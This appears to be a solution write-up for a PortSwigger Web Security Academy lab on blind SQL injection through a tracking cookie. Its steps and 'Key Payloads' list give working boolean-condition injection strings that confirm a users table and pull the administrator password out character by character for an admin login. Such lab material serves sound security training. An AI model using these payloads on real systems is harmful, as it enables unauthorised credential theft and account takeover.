## Blind SQL injection with conditional responses

**Category:** sqli
**Difficulty:** Medium

### Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

### Solution Steps
1. Identify the injection point in the TrackingId cookie
2. Observe the page behavior - look for "Welcome back" message or similar indicator
3. Test boolean conditions: `TrackingId=xyz' AND '1'='1` shows "Welcome back"
4. Test false condition: `TrackingId=xyz' AND '1'='2` hides "Welcome back"
5. This confirms conditional blind SQL injection - page differs based on query truth
6. Confirm users table: `' AND (SELECT 'a' FROM users LIMIT 1)='a`
7. Confirm administrator exists: `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
8. Determine password length: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a`
9. Increment N until "Welcome back" disappears - that's the password length
10. Extract password character-by-character using SUBSTRING:
11. `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
12. Iterate through each position and character (a-z, 0-9) until full password extracted
13. Login as administrator

### Key Payloads
- `Welcome back`
- `users`
- `username`
- `password`
- `administrator`
- `TrackingId`
- `TrackingId=xyz' AND '1'='1`
- `TrackingId=xyz' AND '1'='2`
- `' AND (SELECT 'a' FROM users LIMIT 1)='a`
- `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

### Indicators of Success
- "Welcome back" appears for true conditions
- "Welcome back" disappears for false conditions
- Password length determined by threshold testing
- Full password extracted enables admin login

---
*Source: PortSwigger Web Security Academy*
